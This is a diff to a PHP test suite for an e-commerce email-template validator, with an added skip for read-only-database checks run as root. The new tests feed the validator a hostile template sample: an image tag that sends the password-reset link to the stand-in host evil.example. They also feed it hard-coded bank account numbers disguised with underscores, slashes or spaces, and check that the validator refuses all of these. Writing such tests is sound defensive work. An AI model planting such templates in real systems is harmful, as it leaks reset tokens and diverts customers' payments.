@@ -102,6 +102,17 @@ try {
     }
     assert_equals('', $r6mErrors('order_confirmation', '<p>Splatnosť 12/2026, objednávka {{order_number}} 2026000123/2026, IBAN {{bank_iban}}</p>'),
         'R6 templates: dates and order numbers are not taken for a bank account');
+    // Round 7: a stray apostrophe in an unquoted attribute (alt=x=a') no longer hides the rest of the tag.
+    assert_true(str_contains($r6mErrors('account_password_reset', '<p>Hi</p><img alt=x=a\' src="https://evil.example/p.gif?t= {{reset_url}} ">'), 'reset_url'),
+        'R7 templates: a reset link in an image address after alt=x=a\' is refused (was accepted)');
+    assert_equals('', $r6mErrors('account_password_reset', '<p>Don\'t wait, it\'s <a title="it\'s" href=\'{{reset_url}}\'>here</a>: {{reset_url}}</p>'),
+        'R7 templates: apostrophes in text and attribute values still allow a whole reset link');
+    foreach (['<p>IBAN sk31_1200_0000_1987_4263_7541</p>' => 'underscores', '<p>IBAN SK31/1200/0000/1987/4263/7541</p>' => 'slashes',
+        '<p>IBAN S K 3 1 1 2 0 0 0 0 0 0 1 9 8 7 4 2 6 3 7 5 4 1</p>' => 'a space between every character'] as $r6mHtml => $r6mHow) {
+        assert_true(str_contains($r6mErrors('order_confirmation', $r6mHtml), '{{bank_iban}}'), "R7 templates: a hard-coded bank account written with {$r6mHow} is refused (was accepted)");
+    }
+    assert_equals('', $r6mErrors('order_confirmation', '<p>Doručenie 2-4 dni, objednávka SK-2026-000123, zásielka Z 222 3333 444, IBAN {{bank_iban}}</p>'),
+        'R7 templates: delivery times, order and tracking numbers are still not taken for a bank account');
     assert_true(!EmailTemplates::editable('core_drift_alert', 'sk') && !EmailTemplates::editable('merchant_incident', 'sk') && EmailTemplates::editable('order_shipped', 'sk'),
         'R6 templates: the security notices (core drift alert, incident) cannot be edited');
     $r6mLockedSave = EmailTemplates::save('core_drift_alert', 'sk', ['subject' => 'All fine', 'html' => '<p>All fine</p>', 'text' => '']);
@@ -311,7 +322,11 @@ try {
     assert_equals(['ready', 'ok'], [Health::readiness($r6mReadyCfg, dirname(TEST_CLI_DIR), $r6mOpen())['status'], Health::readiness($r6mReadyCfg, dirname(TEST_CLI_DIR), $r6mOpen())['checks']['database']],
         'R6 readiness: a writable database is ready');
     chmod($r6mDbFile, 0444);
-    try {
+    clearstatcache(true, $r6mDbFile);
+    // root (Docker CI images, some containers) ignores permission bits, so the file stays writable and the check proves nothing.
+    if (is_writable($r6mDbFile)) {
+        echo "  [SKIP] R6 readiness/doctor on a read-only database (chmod 0444 has no effect for this user, e.g. root)\n";
+    } else try {
         $r6mRo = $r6mOpen();
         $r6mReady = Health::readiness($r6mReadyCfg, dirname(TEST_CLI_DIR), $r6mRo);
         assert_equals(['not_ready', 'read_only'], [$r6mReady['status'], $r6mReady['checks']['database'] ?? ''], 'R6 readiness: /readyz is not ready on a read-only database (was ready)');
